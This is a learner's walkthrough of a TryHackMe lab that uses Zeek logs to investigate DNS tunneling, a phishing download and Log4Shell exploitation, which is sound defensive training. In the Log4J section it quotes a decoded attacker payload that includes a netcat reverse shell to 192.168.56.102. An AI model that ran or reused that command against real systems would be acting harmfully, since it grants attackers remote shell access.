# TryHackMe Room: Zeek Exercises

This room was a practical extension of the previous Zeek room, focusing on using the tool to analyze network traffic for specific threats. I practiced identifying anomalous DNS activity, investigating a phishing attempt, and detecting a Log4J vulnerability by correlating Zeek logs with external tools and decoding malicious payloads.

---

## Anomalous DNS

### 1. Investigate the dns-tunneling.pcap file. Investigate the dns.log file. What is the number of DNS records linked to the IPv6 address?

First, I navigated to the appropriate folder and used the standard zeek command to process the dns-tunneling.pcap file. Then, I used zeek-cut to inspect the qtype_name field in the dns.log file. I sorted and counted the unique records to find the number of AAAA records, which are used for IPv6.

zeek -C -r dns-tunneling.pcap
cat dns.log | zeek-cut qtype_name | sort | uniq -c

[Screenshot 01: DNS AAAA count](./screenshots/01-dns-aaaa.png)

### 2. Investigate the conn.log file. What is the longest connection duration?

I filtered the conn.log file for the duration field, sorted the output in reverse order, and displayed the top result using the head command.

cat conn.log | zeek-cut duration | sort -r | head -n 1

[Screenshot 02: Longest connection duration](./screenshots/02-longest-duration.png)

## 3. Investigate the dns.log file. Filter all unique DNS queries. What is the number of unique domain queries?

I used a multi-stage command to clean up the DNS queries before counting them. First, I used zeek-cut to get the query field. Then, I used rev to reverse the string, which allowed me to use cut to isolate the last two components (e.g., com.google instead of www.google.com). After reversing the string back with rev, I used sort, uniq, and wc -l to get the final count of unique domains.

cat dns.log | zeek-cut query |rev | cut -d '.' -f 1-2 | rev | sort |uniq | wc -l

[Screenshot 03: Unique domain queries count](./screenshots/03-unique-domains.png)

### 4. There are a massive amount of DNS queries sent to the same domain. This is abnormal. Let's find out which hosts are involved in this activity. Investigate the conn.log file. What is the IP address of the source host?

I used zeek-cut to isolate the id.orig_h (originating host) field from conn.log. By sorting the results and counting the unique entries, it was easy to spot the source host with the highest number of connections.

cat conn.log | zeek-cut id.orig_h | sort | uniq -c

[Screenshot 04: Source IP from conn.log](./screenshots/04-conn-src-ip.png)

---

## Phishing

### 1. Investigate the logs. What is the suspicious source address? Enter your answer in defanged format.

I changed to the phishing folder and used the standard zeek command on the phishing.pcap file. Then, I used the same technique from the previous section to find the most active originating host.

zeek -C -r phishing.pcap
cat conn.log | zeek-cut id.orig_h | sort | uniq

[Screenshot 05: Phishing source IP](./screenshots/05-phishing-src-ip.png)

The result needed to be "defanged" — a process of neutralizing a potential threat indicator by altering it, making it unclickable and safe to share. For IP addresses, this involves putting the dots in brackets.

### 2. Investigate the http.log file. Which domain address were the malicious files downloaded from? Enter your answer in defanged format.

To find the malicious domain, I inspected the http.log file and looked at the uri and host fields.

[Screenshot 06: Malicious domain](./screenshots/06-malicious-domain.png)

The smart-fax.com domain was responsible for serving the malicious .exe file. I defanged the domain by putting the dot in brackets, similar to the IP address.

### 3. Investigate the malicious document in VirusTotal. What kind of file is associated with the malicious document?

First, I used Zeek with the hash-demo.zeek script to find the MD5 hash of the files in the pcap capture.

zeek -C -r phishing.pcap hash-demo.zeek
cat files.log | zeek-cut mime_type md5

[Screenshot 07: MD5 hash from files.log](./screenshots/07-md5-files-log.png)

I copied the MD5 hash of the second file listed (application/msword) and pasted it into VirusTotal. Under the Relations tab, in the Bundled Files section, I found the associated file type.

[Screenshot 08: VirusTotal Relations tab](./screenshots/08-vt-relations.png)

### 4. Investigate the extracted malicious .exe file. What is the given file name in Virustotal?

I copied the MD5 hash of the third file listed (the .exe file) and searched for it on VirusTotal. The file name was listed directly under the hash on the main page.

[Screenshot 09: VirusTotal .exe filename](./screenshots/09-vt-exe-filename.png)

### 5. Investigate the malicious .exe file in VirusTotal. What is the contacted domain name? Enter your answer in defanged format.

Staying on the same VirusTotal page, I navigated to the Behavior tab. By scrolling down to DNS Resolutions, I found the domain name that the malicious file attempted to contact. Its defanged version is hopto[.]org.

[Screenshot 10: VirusTotal DNS resolutions](./screenshots/10-vt-dns-resolutions.png)

### 6. Investigate the http.log file. What is the request name of the downloaded malicious .exe file?

The answer to this question was already found in task 2 of this section.

---

## Log4J

### 1. Investigate the log4shell.pcapng file with detection-log4j.zeek script. Investigate the signature.log file. What is the number of signature hits?

I went to the log4j folder and ran the Zeek command with the detection-log4j.zeek script. Then, I checked the signatures.log file for sig_id entries and counted them.

zeek -C -r log4shell.pcapng detection-log4j.zeek
cat signatures.log | zeek-cut sig_id | wc -l

[Screenshot 11: Signature hits count](./screenshots/11-signature-hits.png)

### 2. Investigate the http.log file. Which tool is used for scanning?

I used zeek-cut on the http.log file to get the user_agent field. After sorting and counting the unique entries, it was clear which tool was used for scanning due to the high number of duplicates.

cat http.log | zeek-cut user_agent|sort| uniq -c

[Screenshot 12: User agent from http.log](./screenshots/12-user-agent.png)

### 3. Investigate the http.log file. What is the extension of the exploit file?

I used zeek-cut on http.log to get the uri field and then piped the output to sort and uniq to see all unique file extensions.

cat http.log | zeek-cut uri| sort | uniq

[Screenshot 13: Exploit file extension](./screenshots/13-file-extension.png)

### 4. Investigate the log4j.log file. Decode the base64 commands. What is the name of the created file?

First, I examined a few lines of the log4j.log file to understand the content. The value field contained a path with Base64-encoded commands.

cat log4j.log | zeek-cut value | head -n20

I used grep to find the specific Base64 command, which I then copied and decoded in CyberChef.

[Screenshot 14: Base64 value from log4j.log](./screenshots/14-base64-value.png)

The decoded output revealed a series of commands, including one that creates a file.

[Screenshot 15: Decoded commands in CyberChef](./screenshots/15-cyberchef-decoded.png)

The commands were touch /tmp/pwned, which nc > /tmp/pwned, and nc 192.168.56.102 80 -e /bin/sh -vvv. The created file was named pwned.

---

## Summary
In this room, I practiced:

Using advanced command-line techniques to analyze network logs and filter out noise.

Identifying suspicious patterns associated with DNS tunneling.

Investigating a phishing attack by correlating local logs with external resources like VirusTotal.

Learning to analyze and defang malicious IP addresses and domains.

Detecting and analyzing a Log4J vulnerability by using a specific Zeek script and decoding a Base64 payload.

This room was a great exercise in applying Zeek for real-world threat hunting and incident response
